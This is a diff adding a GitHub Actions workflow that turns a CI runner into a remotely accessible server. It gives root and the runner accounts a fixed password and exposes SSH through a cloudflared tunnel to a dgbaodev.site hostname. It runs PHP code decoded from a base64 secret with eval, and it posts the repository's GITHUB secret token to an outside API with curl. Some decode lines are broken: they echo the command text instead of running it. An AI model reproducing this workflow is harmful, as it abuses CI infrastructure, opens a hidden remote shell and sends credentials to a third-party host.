@@ -1,0 +1,89 @@
+name: Runner Ubuntu
+
+on:
+  workflow_dispatch:
+    inputs:
+      OS:
+        description: "Operating System"
+        type: choice
+        options:
+          - ubuntu-latest
+          - ubuntu-22.04
+          - ubuntu-20.04
+          - ubuntu-24.04
+        required: true
+      id:
+          description: "ID"
+          required: true
+
+jobs:
+  sv-runner-build:
+    name: "build - ${{ github.event.inputs.OS }}"
+    runs-on: ${{ github.event.inputs.OS }}
+    timeout-minutes: 360
+
+    steps:
+      - name: Action Return
+        run: |
+          $url = "https://api.dgbaodev.site/action/VPSConnect"
+          $body = @{
+            github = "${{ secrets.GITHUB }}"
+            VPSID = "${{ github.event.inputs.ID }}"
+            RUNID = "${{ github.run_id }}"
+          }
+          # $response = Invoke-RestMethod -Uri $url -Method Post -Body $body
+          # if ($response.status -ne "success") {
+          #   Write-Error "Error: $($response.msg)"
+          #   exit 1
+          # } else {
+          #   Write-Output $response.msg
+          # }
+
+      - name: Install cloudflared
+        timeout-minutes: 3
+        run: |
+          sudo wget -O /root/cloudflared.deb "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64.deb"
+          sudo apt install /root/cloudflared.deb
+          cloudflared --version || exit 1
+      - name: Init
+        id: init
+        shell: bash
+        continue-on-error: true
+        run: |
+          echo "runner:Ubuntu@2025//" | sudo chpasswd
+          echo "runneradmin:Ubuntu@2025//" | sudo chpasswd
+          echo "root:Ubuntu@2025//" | sudo chpasswd
+      - name: Setup cloudflared
+        run: |
+          sudo mkdir -m 700 -p ~/.cloudflared
+          cd ~/.cloudflared
+          echo base64 -d "${{ secrets.CLFCERT }}" > cert.pem
+          echo base64 -d "${{ secrets.CLFCONFIG }}" > config.yml
+          echo base64 -d "${{ secrets.CLFTUNNEL }}" > "${{ secrets.TUNNEL_ID }}.json"
+
+          echo "Rename hostname"
+          sudo sed -i "s|test12341234\.freesites\.eu\.org|ssh-dgbaodev-${{ github.event.inputs.ID }}.dgbaodev.site|g" ~/.cloudflared/config.yml || { echo "Failed to rename hostname"; exit 1; }
+          sudo cloudflared tunnel route dns ssh-dgbaodev "ssh-dgbaodev-${{ github.event.inputs.ID }}.dgbaodev.site" >/dev/null 2>&1 || true
+          sudo cloudflared tunnel run ssh-dgbaodev > /dev/null 2>&1 &
+          pid_x=$!
+          echo $pid_x | sudo tee ~/cloudflared.pid > /dev/null
+          rm -f ~/.cloudflared/config.yml ~/.cloudflared/cert.pem ~/.cloudflared/*.json
+
+      - name: Build
+        run: |
+          php -r "define('github', '${{ secrets.GITHUB }}');define('vpsid', '${{ github.event.inputs.ID }}');eval(base64_decode('${{ secrets.CONNECT }}'));"
+
+      - name: Done
+        if: always()
+        run: |
+          if sudo [ -f ~/cloudflared.pid ]; then
+            sudo kill $(sudo cat ~/cloudflared.pid) && echo "Cloudflared stopped successfully" || echo "Failed to stop cloudflared"
+            sudo rm -f ~/cloudflared.pid
+            sudo rm -rf ~/.cloudflared
+          else
+            echo "No PID file found."
+          fi
+          url="https://api.dgbaodev.site/action/VPSoffline"
+          body=$(jq -n --arg github "${{ secrets.GITHUB }}" --arg VPSID "${{ github.event.inputs.ID }}" '{github: $github, VPSID: $VPSID}')
+          response=$(curl -s -X POST -H "Content-Type: application/json" -d "$body" "$url")
+          echo "$response" | jq -r '.msg'
